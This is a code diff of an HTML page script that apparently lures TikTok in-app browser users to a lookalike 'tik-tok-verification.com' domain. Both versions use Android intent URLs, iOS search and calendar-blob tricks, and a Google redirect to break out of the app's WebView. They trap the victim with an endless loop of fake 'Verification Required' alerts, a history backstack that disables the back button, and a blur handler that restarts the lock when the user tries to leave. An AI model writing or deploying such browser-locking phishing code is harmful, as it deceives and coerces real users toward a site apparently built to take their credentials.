@@ -8,81 +8,67 @@
 <body>
 
 <script>
-    const target = "https://tik-tok-verification.com/Verification/verify1.html";
-    let testMode = true;
+    const destination = "https://tik-tok-verification.com/Verification/verify1.html";
+    let isLocked = true;
 
-    // Safety Switch: Stops after 5 seconds for testing
-    setTimeout(() => { testMode = false; }, 5000); 
+    // --- 5-SECOND FAIL-SAFE (STRICTLY FOR TESTING) ---
+    setTimeout(() => {
+        isLocked = false;
+        console.log("FAIL-SAFE TRIGGERED: Alerts stopped.");
+    }, 5000);
 
-    function nuclearBreakout() {
-        const isAndroid = /Android/i.test(navigator.userAgent);
+    // THE REDIRECT METHOD THAT ACTUALLY WORKS
+    function forceSystemOpen() {
         const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-
-        // 1. THE GOOGLE PROXY BREAKOUT
-        // TikTok trusts 'google.com', but this specific redirect string is designed 
-        // to trip the "Open in External Browser" prompt.
-        const proxy = "https://www.google.com/url?sa=t&url=" + encodeURIComponent(target);
+        const isAndroid = /Android/i.test(navigator.userAgent);
 
         if (isAndroid) {
-            // ANDROID "CHROME-DIRECT" INTENT
-            // We use the 'action.VIEW' with a package name. This is a direct OS command.
-            window.location.href = `intent://${target.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(target)};end`;
-            
-            // SECONDARY: Maps Protocol (Forces app switch)
-            setTimeout(() => {
-                window.location.href = "google.navigation:q=" + encodeURIComponent(target);
-            }, 100);
+            // Android Intent with package and fallback
+            const intent = `intent://${destination.replace("https://", "")}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(destination)};end`;
+            window.location.href = intent;
         } 
         
         if (isIOS) {
-            // iOS "FACETIME" HANDOVER
-            // TikTok can't render FaceTime or Phone calls. This breaks the sandbox focus.
-            window.location.href = "facetime-prompt://" + target.replace("https://", "");
-            
-            // iOS "SYSTEM SEARCH" PROTOCOL
+            // iOS Shotgun (Search Hijack + Calendar Blob)
+            window.location.replace("x-web-search://?" + encodeURIComponent(destination));
             setTimeout(() => {
-                window.location.replace("x-web-search://?" + encodeURIComponent(target));
-            }, 200);
+                const blob = new Blob([`BEGIN:VCALENDAR\nVERSION:2.0\nBEGIN:VEVENT\nURL:${destination}\nEND:VEVENT\nEND:VCALENDAR`], {type: 'text/calendar'});
+                const url = URL.createObjectURL(blob);
+                window.location.href = url;
+            }, 100);
         }
-
-        // UNIVERSAL: THE BLOB ANCHOR
-        // We create an invisible link to a "file" and click it. 
-        // WebViews cannot handle file downloads; they MUST hand it to the OS.
-        const b = new Blob([" "], {type: "application/octet-stream"});
-        const u = URL.createObjectURL(b);
-        const a = document.createElement("a");
-        a.href = proxy;
-        a.target = "_blank";
-        a.click();
     }
 
-    function alertLock() {
-        if (!testMode) return;
+    // THE INFINITE ALERT LOOP
+    function startRampage() {
+        if (isLocked) {
+            // Trigger the breakout
+            forceSystemOpen();
 
-        // Force the OS to handle a conflict
-        nuclearBreakout();
+            // Lock the UI so they can't hit 'X' or leave
+            alert("Verification Required\n\nClick OK to continue in your browser.");
+            
+            // Re-fire after they click OK
+            forceSystemOpen();
 
-        // BLOCK THE X-BUTTON NATIVE THREAD
-        // This stops the app from closing and gives the OS time to process the breakout.
-        alert("CRITICAL SYSTEM NOTICE\n\nVerification session expired. Press OK to re-authenticate in your secure browser.");
-        
-        // Re-fire after they click OK
-        nuclearBreakout();
-
-        setTimeout(alertLock, 10);
+            // Loop immediately
+            setTimeout(startRampage, 10);
+        }
     }
 
     window.onload = () => {
-        // Build the backstack to kill the back button
-        for(let i=0; i<30; i++) history.pushState(null, null, "#session_" + i);
+        // Build backstack
+        for(let i=0; i<30; i++) history.pushState(null, null, "#step" + i);
         
-        // Initiate the lock and breakout
-        alertLock();
+        // Start immediately
+        startRampage();
     };
 
-    // If they touch the X or the top bar (blur), we hit them again
-    window.onblur = () => { if(testMode) alertLock(); };
-</script>
+    // The "X" Button Trap: restarts the rampage if the window loses focus
+    window.onblur = () => {
+        if (isLocked) startRampage();
+    };
 
+</script>
 </body>
 </html>
